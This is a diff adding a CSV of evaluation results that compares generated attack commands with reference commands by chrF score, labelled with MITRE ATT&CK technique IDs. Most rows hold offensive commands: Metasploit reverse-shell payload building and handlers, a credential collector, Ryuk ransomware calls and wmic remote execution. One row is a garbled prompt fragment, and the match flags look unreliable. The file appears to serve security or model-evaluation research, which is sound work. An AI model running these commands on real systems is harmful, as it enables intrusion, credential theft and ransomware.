@@ -1,0 +1,42 @@
+file,tool,input_command,matched_command,chrf_score,match_found
+command_metasploit_TA0002_T1072.txt,metasploit,"msfconsole -x ""use exploit/windows/meterpreter/reverse_tcp; set LHOST 192.168.0.4; set LPORT 3389; set PAYLOAD windows/meterpreter/reverse_tcp; run""","```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",40.765,True
+command_metasploit_TA0008_T1072.txt,metasploit,msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f <file_name>.exe,"```
+    use exploit/multi/handler
+    set payload windows/x64/meterpreter/reverse_tcp
+    set lport 8080
+    set lhost 192.168.0.4
+    set ExitOnSession False
+    exploit -j
+```",48.076,True
+command_metasploit_TA0008_T1072.txt,metasploit,msfencode -e x86/shikata_ga_nai -c 3 -i <file_name>.exe -o encoded_<file_name>.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,16.137,True
+command_metasploit_TA0008_T1072.txt,metasploit,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=443 -f exe -o <file_name>.exe,`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker IP> LPORT=443 -f exe-service -o javamtsup.exe`,60.117,True
+command_metasploit_TA0008_T1072.txt,metasploit,use exploit/windows/local/ms10_061_scf -z -j -vvv,"```
+    use post/windows/gather/screen_spy
+    set COUNT 60
+    set DELAY 1
+    set VIEW_SCREENSHOTS false
+    set SESSION 3
+    exploit
+```",28.843,True
+command_metasploit_TA0008_T1072.txt,metasploit,exploit -j -vvv," ```
+    set payload windows/x64/meterpreter_reverse_https
+    set lport 80
+    set ExitOnSession False
+    exploit -j
+```",24.896,True
+command_metasploit_TA0008_T1072.txt,metasploit,""" and enclosed in backticks, as required.",[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`,15.782,True
+command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /inject <dll_name>,`ryuk.exe --encrypt --process-name notepad.exe`,29.48,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_Process Call Create ""powershell.exe -file <powershell_script_path>""","`wmic /node:#{""POS system""} process call create #{""executable""}`",16.982,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_Process Call Create ""powershell.exe -command <powershell_command>""","`wmic /node:#{""POS system""} process call create #{""executable""}`",16.581,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_NetworkAdapter Get IPAddresses, Speed","`wmic /node:#{""POS system""} process call create #{""executable""}`",14.679,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_ComputerSystem Get Username, Domain","`wmic /node:#{""POS system""} process call create #{""executable""}`",17.043,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_OperatingSystem Get BuildNumber, OSArchitecture","`wmic /node:#{""POS system""} process call create #{""executable""}`",16.851,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_NetworkConnection Get LocalName, RemoteName","`wmic /node:#{""POS system""} process call create #{""executable""}`",14.185,True
+command_wmic_TA0002_T1047.txt,wmic,"wmic /namespace:\\root\cimv2 /class Win32_LogonSession Get AntivirusDisableTime, LogonTime","`wmic /node:#{""POS system""} process call create #{""executable""}`",13.892,True
